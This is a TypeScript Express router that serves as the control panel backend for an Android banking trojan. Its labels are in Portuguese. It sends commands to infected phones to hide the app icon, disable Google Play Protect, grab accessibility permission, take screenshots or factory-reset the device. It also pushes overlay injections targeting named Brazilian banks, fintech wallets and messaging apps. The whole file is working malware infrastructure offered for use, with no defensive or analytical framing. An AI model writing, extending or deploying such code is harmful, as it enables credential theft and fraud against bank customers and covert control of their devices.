import { Router } from "express";
import { db } from "@workspace/db";
import { devicesTable, eventsTable } from "@workspace/db";
import { eq, sql, desc } from "drizzle-orm";
import {
  GetDeviceParams,
  ListEventsQueryParams,
  SendCommandBody,
} from "@workspace/api-zod";
import type { Request, Response } from "express";
import type { Server as SocketIoServer } from "socket.io";

const router = Router();

router.get("/devices", async (req: Request, res: Response) => {
  const devices = await db.query.devicesTable.findMany({
    orderBy: desc(devicesTable.lastSeen),
  });
  res.json(devices);
});

router.get("/devices/stats", async (req: Request, res: Response) => {
  const rows = await db
    .select({ status: devicesTable.status, count: sql<number>`count(*)::int` })
    .from(devicesTable)
    .groupBy(devicesTable.status);

  const stats = { total: 0, online: 0, offline: 0, idle: 0, busy: 0 };
  for (const row of rows) {
    const s = row.status as keyof typeof stats;
    stats[s] = row.count;
    stats.total += row.count;
  }
  res.json(stats);
});

router.get("/devices/:id", async (req: Request, res: Response) => {
  const parsed = GetDeviceParams.safeParse(req.params);
  if (!parsed.success) {
    res.status(400).json({ error: "Invalid params" });
    return;
  }
  const device = await db.query.devicesTable.findFirst({
    where: eq(devicesTable.id, parsed.data.id),
  });
  if (!device) {
    res.status(404).json({ error: "Not found" });
    return;
  }
  res.json(device);
});

router.get("/events", async (req: Request, res: Response) => {
  const parsed = ListEventsQueryParams.safeParse(req.query);
  const query = parsed.success ? parsed.data : {};
  const limit = query.limit ?? 50;

  const events = await db
    .select({
      id: eventsTable.id,
      deviceId: eventsTable.deviceId,
      deviceName: devicesTable.name,
      type: eventsTable.type,
      message: eventsTable.message,
      createdAt: eventsTable.createdAt,
    })
    .from(eventsTable)
    .innerJoin(devicesTable, eq(eventsTable.deviceId, devicesTable.id))
    .where(query.deviceId ? eq(eventsTable.deviceId, query.deviceId) : undefined)
    .orderBy(desc(eventsTable.createdAt))
    .limit(limit);

  res.json(events);
});

router.get("/commands", async (_req: Request, res: Response) => {
  res.json([
    { id: "request_accessibility", label: "Solicitar Acessibilidade", description: "Solicitar permissão de acessibilidade", icon: "shield", category: "remote" },
    { id: "hide_icon", label: "Ocultar Ícone", description: "Ocultar ícone do lançador do app", icon: "eye-off", category: "remote" },
    { id: "disable_play_protect", label: "Desativar Play Protect", description: "Desativar Google Play Protect", icon: "shield-off", category: "remote" },
    { id: "mute_device", label: "Silenciar Dispositivo", description: "Silenciar todos os sons do dispositivo", icon: "volume-x", category: "remote" },
    { id: "restart_app", label: "Reiniciar App", description: "Forçar reinicialização do agente", icon: "refresh-cw", category: "remote" },
    { id: "launch_app", label: "Launch App", description: "Iniciar aplicação padrão", icon: "play", category: "system" },
    { id: "lock", label: "Lock", description: "Bloquear tela do dispositivo", icon: "lock", category: "system" },
    { id: "update_status", label: "Update Status", description: "Solicitar atualização de status", icon: "activity", category: "system" },
    { id: "screenshot", label: "Screenshot", description: "Capturar tela do dispositivo", icon: "camera", category: "system" },
    { id: "reboot", label: "Reboot", description: "Reiniciar dispositivo remotamente", icon: "power", category: "danger" },
    { id: "factory_reset", label: "Factory Reset", description: "Restaurar configurações de fábrica", icon: "trash-2", category: "danger" },
  ]);
});

const TARGET_INJECTIONS = [
  { id: "bb", label: "Banco do Brasil", package: "br.com.bb.android", category: "bank" },
  { id: "caixa", label: "Caixa Econômica", package: "br.gov.caixa.internet.app", category: "bank" },
  { id: "bradesco", label: "Bradesco", package: "com.bradesco", category: "bank" },
  { id: "itau", label: "Itaú", package: "com.itau", category: "bank" },
  { id: "nubank", label: "Nubank", package: "com.nubank", category: "bank" },
  { id: "inter", label: "Banco Inter", package: "br.com.intermedium", category: "bank" },
  { id: "santander", label: "Santander", package: "com.santander.app", category: "bank" },
  { id: "sicredi", label: "Sicredi", package: "mobi.sicredi", category: "bank" },
  { id: "picpay", label: "PicPay", package: "com.picpay", category: "fintech" },
  { id: "mercadopago", label: "Mercado Pago", package: "com.mercadopago.wallet", category: "fintech" },
  { id: "pagbank", label: "PagBank", package: "br.com.uol.ps.myaccount", category: "fintech" },
  { id: "whatsapp", label: "WhatsApp", package: "com.whatsapp", category: "social" },
  { id: "instagram", label: "Instagram", package: "com.instagram.android", category: "social" },
  { id: "facebook", label: "Facebook", package: "com.facebook.katana", category: "social" },
  { id: "telegram", label: "Telegram", package: "org.telegram.messenger", category: "social" },
];

router.get("/injections", async (_req: Request, res: Response) => {
  res.json(TARGET_INJECTIONS);
});

router.post("/injections", async (req: Request, res: Response) => {
  const { deviceId, targetId } = req.body;
  if (!deviceId || !targetId) {
    res.status(400).json({ error: "deviceId and targetId required" });
    return;
  }
  const target = TARGET_INJECTIONS.find(t => t.id === targetId);
  if (!target) {
    res.status(404).json({ error: "Target not found" });
    return;
  }
  const device = await db.query.devicesTable.findFirst({ where: eq(devicesTable.id, deviceId) });
  if (!device) {
    res.status(404).json({ success: false, message: "Device not found" });
    return;
  }
  const io: SocketIoServer = req.app.get("io");
  if (device.socketId) {
    io.to(device.socketId).emit("command:received", { command: `inject:overlay:${target.package}` });
  }
  await db.insert(eventsTable).values({
    deviceId,
    type: "injection",
    message: `Overlay injection enviado: ${target.label} (${target.package})`,
  });
  io.emit("event:new", {
    deviceId,
    deviceName: device.name,
    type: "injection",
    message: `Overlay injection enviado para ${device.name}: ${target.label}`,
    createdAt: new Date().toISOString(),
  });
  res.json({ success: true, message: `Injection '${target.label}' enviada para ${device.name}` });
});

router.post("/commands", async (req: Request, res: Response) => {
  const parsed = SendCommandBody.safeParse(req.body);
  if (!parsed.success) {
    res.status(400).json({ error: "Invalid body" });
    return;
  }
  const { deviceId, command } = parsed.data;

  const device = await db.query.devicesTable.findFirst({
    where: eq(devicesTable.id, deviceId),
  });

  if (!device) {
    res.status(404).json({ success: false, message: "Device not found" });
    return;
  }

  const io: SocketIoServer = req.app.get("io");

  if (device.socketId) {
    io.to(device.socketId).emit("command:received", { command });
  }

  await db.insert(eventsTable).values({
    deviceId,
    type: "command",
    message: `Command sent: ${command}`,
  });

  io.emit("event:new", {
    deviceId,
    deviceName: device.name,
    type: "command",
    message: `Command sent to ${device.name}: ${command}`,
    createdAt: new Date().toISOString(),
  });

  res.json({ success: true, message: `Command '${command}' sent to ${device.name}` });
});

export default router;
